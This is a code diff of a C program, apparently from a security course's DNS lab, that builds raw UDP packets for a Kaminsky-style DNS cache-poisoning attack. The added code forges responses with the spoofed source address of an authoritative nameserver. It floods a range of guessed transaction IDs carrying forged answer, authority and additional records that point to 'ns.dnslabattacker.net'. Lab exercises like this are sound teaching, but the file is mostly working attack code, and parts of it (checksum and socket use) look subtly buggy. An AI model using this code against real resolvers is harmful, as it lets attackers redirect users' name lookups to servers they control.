@@ -8,10 +8,10 @@
 // The response packet needs to be completed.
 //
 // Compile command:
-// gcc udp.c -o udp
+// gcc -lpcap udp.c -o udp
 //
 // The program must be run as root
-// sudo ./udp
+// sudo ./udp 192.168.15.20 192.168.15.18
 
 #include <unistd.h>
 #include <stdio.h>
@@ -68,8 +68,8 @@ struct dataEnd{
 };
 // total udp header length: 8 bytes (=64 bits)
 
-// The End of DNS Question/Answer data
-struct ansEnd
+// The End of a Session
+struct sesEnd
 {
     unsigned short int type;
     unsigned short int class;
@@ -120,7 +120,7 @@ unsigned short csum(unsigned short *buf, int nwords)
     return (unsigned short)(~sum);
 }
 
-void responsePacket(char *dns_data, char *dest_add);
+void responsePacket(int sd, char *dest_add);
 
 int main(int argc, char *argv[])
 {
@@ -132,26 +132,39 @@ int main(int argc, char *argv[])
 
     // socket descriptor
     int sd;
+    int sd_res;
 
-    // buffer to hold the packet
-    char buffer[PCKT_LEN];
-
-    // set the buffer to 0 for all bytes
+    // buffer to hold the request packet
+    char buffer[PCKT_LEN];  
+    // buffer to hold the response packet
+    char buffer_res[PCKT_LEN];
+    
+    // set the request buffer to 0 for all bytes
     memset(buffer, 0, PCKT_LEN);
+    // set the response buffer to 0 for all bytes
+    memset(buffer_res, 0, PCKT_LEN);
 
-    // Our own headers' structures
+    // Request-Header
     struct ipheader *ip = (struct ipheader *)buffer;
     struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
     struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
+    // Response-Header
+    struct ipheader *ip_res = (struct ipheader *)buffer_res;
+    struct udpheader *udp_res = (struct udpheader *)(buffer_res + sizeof(struct ipheader));
+    struct dnsheader *dns_res=(struct dnsheader*)(buffer_res +sizeof(struct ipheader)+sizeof(struct udpheader));    
 
-    // data is the pointer points to the first byte of the dns payload  
+    // data is the pointer points to the first byte of the request dns payload
     char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
+    // data_res is the pointer points to the first byte of the response dns payload
+    char *data_res=(buffer_res +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));  
+    
 
     ////////////////////////////////////////////////////////////////////////
     // dns fields(UDP payload field)
     // relate to the lab, you can change them. begin:
     ////////////////////////////////////////////////////////////////////////
 
+// Request-Packet
     // The flag you need to set
     dns->flags=htons(FLAG_Q);
     
@@ -159,13 +172,87 @@ int main(int argc, char *argv[])
     dns->QDCOUNT=htons(1);
     
     //query string
-    strcpy(data,"\5aaaaa\7example\3edu");
+    strcpy(data,"\5aaaaa\7example\3com");
     int length= strlen(data)+1;
 
     //this is for convenience to get the struct type write the 4bytes in a more organized way.
     struct dataEnd * end=(struct dataEnd *)(data+length);
     end->type=htons(1);
     end->class=htons(1);
+    
+    
+// Response-Packet
+    // The flag you need to set
+    dns_res->flags=htons(FLAG_R);
+    
+    // only 1 query, so the count should be one.
+    dns_res->QDCOUNT=htons(1);
+    // Authoritative Answer: 1 (the final answer)
+    dns_res->ANCOUNT=htons(1);    
+    // Name Server or Authority: 1 (an authority info)
+    dns_res->NSCOUNT=htons(1);    
+    // Additional Record: 2 for additional info
+    dns_res->ARCOUNT=htons(2);        
+    
+    //query string
+    strcpy(data_res,"\5aaaaa\7example\3com");
+    int length_res= strlen(data_res)+1;
+
+    //this is for convenience to get the struct type write the 4bytes in a more organized way.
+    struct dataEnd * end_res=(struct dataEnd *)(data_res+length_res);
+    end_res->type=htons(1);
+    end_res->class=htons(1);
+    length_res+=4;
+    strcpy(data_res+length_res,"\xc0\x0c");
+    length_res+=2;
+    
+    struct sesEnd * end_res_ans = (struct sesEnd *)(data_res+length_res);
+    end_res_ans->type=htons(1);
+    end_res_ans->class=htons(1);
+    end_res_ans->ttl_l=htons(512);
+    end_res_ans->ttl_u=htons(0);
+    end_res_ans->datalen=htons(4);
+    length_res+=10;
+    
+    strcpy(data_res+length_res, "\1\1\1\1");
+    length_res+=4;
+    
+    strcpy(data_res+length_res, "\xC0\x12");
+    length_res+=2;
+    
+    struct sesEnd * end_res_ns = (struct sesEnd *)(data_res+length_res);
+    end_res_ns->type=htons(2);
+    end_res_ns->class=htons(1);
+    end_res_ns->ttl_l=htons(512);
+    end_res_ns->ttl_u=htons(0);
+    end_res_ns->datalen=htons(23);
+    length_res+=10;
+    
+    strcpy(data_res+length_res, "\2ns\16dnslabattacker\3net");
+    length_res+=23;
+
+    strcpy(data_res+length_res, "\2ns\16dnslabattacker\3net");
+    length_res+=23;
+    
+    struct sesEnd * end_res_add = (struct sesEnd *)(data_res+length_res);
+    end_res_add->type=htons(1);
+    end_res_add->class=htons(1);
+    end_res_add->ttl_l=htons(512);
+    end_res_add->ttl_u=htons(0);
+    end_res_add->datalen=htons(4);
+    length_res+=10; 
+    strcpy(data_res+length_res, "\1\1\1\1");
+    length_res+=5;
+    
+    struct dataEnd *end_res_end = (struct dataEnd *)(data_res+length_res);
+    end_res_end->type = htons(41);
+    end_res_end->class = htons(4096);
+    length_res+=6;
+
+    struct dataEnd *end_res_end2 = (struct dataEnd *)(data_res+length_res);
+    end_res_end2->type = htons(34816);
+    end_res_end2->class = htons(0);
+    
 
     /////////////////////////////////////////////////////////////////////
     //
@@ -179,61 +266,86 @@ int main(int argc, char *argv[])
      ***************************************************************************************/
     
     // Source and destination addresses: IP and port
-//  struct sockaddr_in sin, din;
-    struct sockaddr_in sin;
+    struct sockaddr_in sin, din;
     int one = 1;
     const int *val = &one;
     dns->query_id=rand(); // transaction ID for the query packet, use random #
+    dns_res->query_id=rand(); // transaction ID for the query packet, use random #    
 
     // Create a raw socket with UDP protocol
-    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+    sd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    sd_res = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 
     if(sd<0) // if socket fails to be created 
         printf("socket error\n");
+    
+    if(sd_res<0) // if socket fails to be created 
+        printf("socket error\n");    
 
     // The source is redundant, may be used later if needed
     // The address family
-    sin.sin_family = AF_INET;
-//  din.sin_family = AF_INET;
+    sin.sin_family = AF_INET;   // Request
+    din.sin_family = AF_INET;   // Response
 
     // Port numbers
-    sin.sin_port = htons(33333);
-//  din.sin_port = htons(53);
+    sin.sin_port = htons(33333);    // Request
+    din.sin_port = htons(53);   // Response
 
     // IP addresses
     sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
-//  din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
+    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
 
-    // *** IP HEADER ***
-    // Fabricate the IP header or we can use the standard header structures but assign our own values.
+    
+// *** IP HEADER ***
+    // REQUEST
     ip->iph_ihl = 5;
     ip->iph_ver = 4;
     ip->iph_tos = 0; // Low delay
-
     unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd));
     ip->iph_len=htons(packetLength);
     ip->iph_ident = htons(rand()); // give a random number for the identification#
     ip->iph_ttl = 110; // hops
     ip->iph_protocol = 17; // UDP
-
     // Source IP address, can use spoofed address here!!!
     ip->iph_sourceip = inet_addr(argv[1]);
-
     // The destination IP address
     ip->iph_destip = inet_addr(argv[2]);
+        
+    // RESPONSE
+    ip_res->iph_ihl = 5;
+    ip_res->iph_ver = 4;
+    ip_res->iph_tos = 0; // Low delay
+    unsigned short int packetLength_res =(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length_res + sizeof(struct dataEnd));
+    ip_res->iph_len=htons(packetLength_res);
+    ip_res->iph_ident = htons(rand()); // give a random number for the identification#
+    ip_res->iph_ttl = 110; // hops
+    ip_res->iph_protocol = 17; // UDP
+    // Source IP address, can use spoofed address here!!!
+    ip_res->iph_sourceip = inet_addr("199.43.135.53");
+    // The destination IP address
+    ip_res->iph_destip = inet_addr(argv[2]);    
     
-    
-    // *** UDP HEADER ***
-    // Fabricate the UDP header. Source port number, redundant
-    udp->udph_srcport = htons(33333);  // source port number. remember the lower number may be reserved
-    
-    // Destination port number
+
+// *** UDP HEADER ***
+    // Request
+    udp->udph_srcport = htons(40000+rand()%10000);
     udp->udph_destport = htons(53);
     udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));
+    
+    // Response
+    udp_res->udph_srcport = htons(33333);
+    udp_res->udph_destport = htons(53);
+    udp_res->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length_res+sizeof(struct dataEnd));    
+    
 
-    // Calculate the checksum for integrity
-    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
-    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
+// *** Checksum ***
+    // Request
+    ip->iph_chksum = csum((unsigned short *)buffer_res, sizeof(struct ipheader) + sizeof(struct udpheader));
+    udp->udph_chksum=check_udp_sum(buffer_res, packetLength-sizeof(struct ipheader));
+    
+    // Response
+    ip_res->iph_chksum = csum((unsigned short *)buffer_res, sizeof(struct ipheader) + sizeof(struct udpheader));
+    udp_res->udph_chksum=check_udp_sum(buffer_res, packetLength_res-sizeof(struct ipheader));    
     
     /*******************************************************************************8
       Tips
@@ -268,179 +380,25 @@ int main(int argc, char *argv[])
         int charnumber;
         charnumber=1+rand()%5;
         *(data+charnumber)+=1;
+        *(data_res+charnumber)+=1;        
 
         udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
 
         // send the packet out.
         if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
             printf("packet send error %d which means %s\n",errno,strerror(errno));
-        sleep(0.9);        
-        responsePacket(data, argv[2]);
+        sleep(0.9);
+
+        int cnt = 3000; // count
+        while(cnt<3100){
+            dns_res->query_id=cnt;
+            udp_res->udph_chksum=check_udp_sum(buffer_res, packetLength_res-sizeof(struct ipheader));
+            
+            if(sendto(sd, buffer_res, packetLength_res, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+                printf("packet send error %d which means %s\n",errno,strerror(errno));
+            cnt++;
+        }
     }
     close(sd);
     return 0;
 }
-
-void responsePacket(char *dns_data, char *dest_addr){
-    int sd;
-    char buffer[PCKT_LEN];
-    memset(buffer, 0 ,PCKT_LEN);
-    
-    // Our own headers' structures
-    struct ipheader *ip = (struct ipheader *)buffer;
-    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
-    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
-
-    // data is the pointer points to the first byte of the dns payload  
-    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
-    
-    
-    // The flag you need to set
-    dns->flags=htons(FLAG_R);
-    
-    // Question count: the server repeats the question in the response packet so the question count is almost always 1
-    dns->QDCOUNT=htons(1);
-
-    // Authoritative Answer count should be 1 as the final answer
-    dns->ANCOUNT=htons(1);
-    
-    // Name Server count, or Authority count, should be 1 for an authority info
-    dns->NSCOUNT=htons(1);    
-    
-    // Additional Record count should be 1 for an additional info
-    dns->ARCOUNT=htons(1);    
-    
-    // Query String
-    strcpy(data, dns_data);
-    int length = strlen(data) + 1;
-
-    // this is for convenience to get the struct type write the 4bytes in a more organized way.
-    struct dataEnd * end=(struct dataEnd *)(data + length);
-    end->type=htons(1);
-    end->class=htons(1);
-    
-    // Answer Section
-    char *ans = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length);
-    
-    strcpy(ans, dns_data);
-    int anslength = strlen(ans) + 1;
-    
-    struct ansEnd *ansend = (struct ansEnd *)(ans + anslength);
-    ansend->type = htons(1);
-    ansend->class = htons(1);
-    ansend->ttl_l = htons(0x00);
-    ansend->ttl_u = htons(0xD0);
-    ansend->datalen = htons(4);
-    
-    char *ansaddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength);
-    
-    strcpy(ansaddr, "\1\1\1\1");
-    int addrlen = strlen(ansaddr);
-    
-    // Authorization section
-    char *ns = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen);
-    strcpy(ns, "\7example\3com");
-    int nslength = strlen(ns) + 1;
-    
-    struct ansEnd *nsend = (struct ansEnd *)(ns + nslength);
-    nsend->type = htons(2);
-    nsend->class = htons(1);
-    nsend->ttl_l = htons(0x00);
-    nsend->ttl_u = htons(0xD0);
-    nsend->datalen = htons(23);
-    
-    char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength);
-    strcpy(nsname, "\2ns\16dnslabattacker\3net");
-    int nsnamelen = strlen(nsname) + 1;
-    
-    // Additional Section
-    char *ar = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen);
-    strcpy(ar, "\2ns\16dnslabattacker\3net");
-    int arlength = strlen(ar) + 1;
-    struct ansEnd *arend = (struct ansEnd *)(ar + arlength);
-    arend->type = htons(1);
-    arend->class = htons(1);
-    arend->ttl_l = htons(0x00);
-    arend->ttl_u = htons(0xD0);
-    arend->datalen = htons(4);
-    char *araddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd));
-    strcpy(araddr, "\1\1\1\1");
-    int araddrlen = strlen(araddr);
-    
-    // End of DNS packet
-    
-    
-    // Destination addresses: IP and port
-    struct sockaddr_in sin;
-    int one = 1;
-    const int *val = &one;
-
-    // Create a raw socket with UDP protocol
-    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
-
-    if(sd<0) // if socket fails to be created 
-        printf("socket error\n");
-
-    // The address family
-    sin.sin_family = AF_INET;
-
-    // Port numbers
-    sin.sin_port = htons(33333);
-
-    // IP addresses
-    sin.sin_addr.s_addr = inet_addr(dest_addr);
-
-    // Fabricate the IP header or we can use the
-    // standard header structures but assign our own values.
-    ip->iph_ihl = 5;
-    ip->iph_ver = 4;
-    ip->iph_tos = 0; // Low delay
-
-    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd) + araddrlen);
-    ip->iph_len=htons(packetLength);
-    ip->iph_ident = htons(rand()); // give a random number for the identification#
-    ip->iph_ttl = 110; // hops
-    ip->iph_protocol = 17; // UDP
-
-    // Source IP address, can use spoofed address here!!!
-    ip->iph_sourceip = inet_addr("199.43.135.53");
-
-    // The destination IP address
-    ip->iph_destip = inet_addr(dest_addr);
-
-    // Fabricate the UDP header. Source port number, redundant
-    udp->udph_srcport = htons(53);
-    
-    // Destination port number
-    udp->udph_destport = htons(33333);
-    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd) + araddrlen);
-
-    // Calculate the checksum for integrity
-    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
-    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
-    
-    // Inform the kernel to not fill up the packet structure. we will build our own...
-    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
-    {
-        printf("error\n");	
-        exit(-1);
-    }
-    
-    int count = 0;
-    int trans_id = 3000;
-    while(count < 100){
-        dns->query_id = trans_id + count;
-        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
-        
-        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
-            printf("Packet send error %d which means %s\n", errno, strerror(errno));
-        count++;
-    }
-
-    close(sd);
-
-    
-}
-
-// What
-// Hm....
